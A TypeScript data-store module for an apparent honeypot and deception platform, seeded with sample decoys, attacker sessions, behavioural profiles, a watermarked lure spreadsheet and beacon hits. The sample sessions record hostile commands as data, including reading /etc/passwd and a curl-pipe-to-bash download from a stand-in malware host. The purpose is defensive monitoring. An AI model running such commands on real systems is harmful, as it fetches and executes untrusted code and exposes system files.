import { AttackerProfile, BeaconEvent, HoneypotProfile, LureDocument, SessionEvent } from '@/shared/types';
import fs from 'fs';
import path from 'path';

interface DatabaseSchema {
  honeypots: HoneypotProfile[];
  events: SessionEvent[];
  attackerProfiles: AttackerProfile[];
  lures: LureDocument[];
  beacons: BeaconEvent[];
  lureContents: Record<string, string>; // lureId -> raw document content
  auditLog: Array<{ id: string; timestamp: string; action: string; hash: string }>;
}

const DB_PATH = path.join(process.cwd(), 'data', 'ciphernest-store.json');

const INITIAL_SEED: DatabaseSchema = {
  honeypots: [
    {
      id: 'hp-cowrie-01',
      name: 'SSH Core Decoy (Cowrie)',
      type: 'Cowrie',
      status: 'active',
      port: 2222,
      ip: '127.0.0.1',
      containerId: 'doc-7f9a8b1c',
      twinSyncEnabled: true,
      temporalJitterMs: 350,
      activeSessionsCount: 3,
      totalEventsCount: 142,
      createdAt: new Date(Date.now() - 86400000 * 3).toISOString(),
    },
    {
      id: 'hp-customllm-02',
      name: 'AI-Native Dynamic Decoy (CustomLLM)',
      type: 'CustomLLM',
      status: 'active',
      port: 2223,
      ip: '127.0.0.1',
      containerId: 'doc-3e2a1d9c',
      twinSyncEnabled: true,
      temporalJitterMs: 480,
      activeSessionsCount: 1,
      totalEventsCount: 89,
      createdAt: new Date(Date.now() - 86400000 * 2).toISOString(),
    },
    {
      id: 'hp-dionaea-03',
      name: 'Malware Trap (Dionaea)',
      type: 'Dionaea',
      status: 'stopped',
      port: 445,
      ip: '127.0.0.1',
      containerId: 'doc-9c8b7a6f',
      twinSyncEnabled: false,
      temporalJitterMs: 150,
      activeSessionsCount: 0,
      totalEventsCount: 23,
      createdAt: new Date(Date.now() - 86400000).toISOString(),
    },
  ],
  events: [
    {
      id: 'evt-101',
      sessionId: 'sess-88a91b',
      honeypotId: 'hp-cowrie-01',
      honeypotName: 'SSH Core Decoy (Cowrie)',
      attackerIp: '194.26.29.112',
      location: 'Bucharest, Romania',
      kind: 'command_exec',
      payload: 'cat /etc/passwd; id; uname -a',
      timestamp: new Date(Date.now() - 900000).toISOString(),
      commands: [
        {
          id: 'cmd-1',
          sessionId: 'sess-88a91b',
          honeypotId: 'hp-cowrie-01',
          timestamp: new Date(Date.now() - 900000).toISOString(),
          command: 'cat /etc/passwd',
          output: 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/bash',
          executionDelayMs: 340,
          entropyScore: 3.84,
        },
        {
          id: 'cmd-2',
          sessionId: 'sess-88a91b',
          honeypotId: 'hp-cowrie-01',
          timestamp: new Date(Date.now() - 880000).toISOString(),
          command: 'uname -a',
          output: 'Linux cipher-node-01 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC UTC 2026 x86_64 GNU/Linux',
          executionDelayMs: 210,
          entropyScore: 3.12,
        },
      ],
    },
    {
      id: 'evt-102',
      sessionId: 'sess-99b82c',
      honeypotId: 'hp-customllm-02',
      honeypotName: 'AI-Native Dynamic Decoy (CustomLLM)',
      attackerIp: '45.142.214.7',
      location: 'St. Petersburg, Russia',
      kind: 'malware_drop',
      payload: 'curl -s http://malware-drop.cx/agent.sh | bash',
      timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
      commands: [
        {
          id: 'cmd-3',
          sessionId: 'sess-99b82c',
          honeypotId: 'hp-customllm-02',
          timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
          command: 'curl -s http://malware-drop.cx/agent.sh | bash',
          output: 'Downloading payload... [OK]\nExecuting agent script...\nPermission denied.',
          executionDelayMs: 580,
          entropyScore: 4.45,
        },
      ],
    },
  ],
  attackerProfiles: [
    {
      id: 'atk-profile-112',
      ip: '194.26.29.112',
      classification: 'AIAgent',
      confidence: 0.94,
      firstSeenAt: new Date(Date.now() - 86400000 * 5).toISOString(),
      lastSeenAt: new Date(Date.now() - 900000).toISOString(),
      totalSessions: 14,
      totalCommands: 87,
      timingJitterAvgMs: 120,
      mitreTechniques: ['T1059.004 (Command Interpreter)', 'T1082 (System Info Discovery)', 'T1005 (Data from Local System)'],
      threatLevel: 'Critical',
      behavioralDNA: {
        commandVelocityPerMin: 42.5,
        typoFrequencyScore: 0.01,
        toolSignature: 'Autonomous LLM Agent / Agentic Red Team Runner',
        timezoneEstimate: 'UTC+02:00',
        botProbability: 0.98,
      },
    },
    {
      id: 'atk-profile-214',
      ip: '45.142.214.7',
      classification: 'HumanOperator',
      confidence: 0.81,
      firstSeenAt: new Date(Date.now() - 86400000 * 2).toISOString(),
      lastSeenAt: new Date(Date.now() - 3600000 * 4).toISOString(),
      totalSessions: 3,
      totalCommands: 19,
      timingJitterAvgMs: 2400,
      mitreTechniques: ['T1105 (Ingress Tool Transfer)', 'T1068 (Exploitation for Privilege Escalation)'],
      threatLevel: 'High',
      behavioralDNA: {
        commandVelocityPerMin: 4.2,
        typoFrequencyScore: 0.14,
        toolSignature: 'Manual Interactive SSH / Custom Bash Scripts',
        timezoneEstimate: 'UTC+03:00',
        botProbability: 0.12,
      },
    },
  ],
  lures: [
    {
      id: 'lure-doc-01',
      title: 'Q3_Executive_Compensation_2026.csv',
      docType: 'XLSX',
      targetCompany: 'Acme Cyber Security',
      industry: 'Defense & Financial Services',
      watermark: {
        token: 'wt_89f1a2c4e5b6',
        embeddedAt: new Date(Date.now() - 86400000 * 4).toISOString(),
        stegoWhitespaceSignature: '\u200B\u200C\u200B\u200C',
        metadataTag: 'CN-WM-89F1A2C4',
      },
      beaconHitsCount: 4,
      createdAt: new Date(Date.now() - 86400000 * 4).toISOString(),
    },
  ],
  beacons: [
    {
      id: 'beacon-01',
      lureId: 'lure-doc-01',
      documentTitle: 'Q3_Executive_Compensation_2026.csv',
      watermarkToken: 'wt_89f1a2c4e5b6',
      sourceIp: '185.220.101.4',
      location: 'Frankfurt, Germany (TOR Exit Node)',
      userAgent: 'LibreOffice/7.6 (Linux x86_64)',
      timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
    },
  ],
  lureContents: {
    'lure-doc-01': 'Employee,Title,Salary,Bonus,Vault_Passkey\nJohn Doe,CEO,280000,45000,sk_live_ceokey_89f1a2c4\nJane Smith,CTO,240000,35000,sk_live_ctokey_3e4d5c6b\n/* \u200B\u200C\u200B\u200C META:CN-WM-89F1A2C4 */',
  },
  auditLog: [
    {
      id: 'audit-001',
      timestamp: new Date(Date.now() - 86400000 * 5).toISOString(),
      action: 'SYSTEM_INITIALIZATION',
      hash: '0x9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a',
    },
  ],
};

function ensureDbExists(): DatabaseSchema {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify(INITIAL_SEED, null, 2), 'utf-8');
    return INITIAL_SEED;
  }

  try {
    const raw = fs.readFileSync(DB_PATH, 'utf-8');
    return JSON.parse(raw) as DatabaseSchema;
  } catch {
    fs.writeFileSync(DB_PATH, JSON.stringify(INITIAL_SEED, null, 2), 'utf-8');
    return INITIAL_SEED;
  }
}

export function readDb(): DatabaseSchema {
  return ensureDbExists();
}

export function writeDb(data: DatabaseSchema): void {
  ensureDbExists();
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), 'utf-8');
}
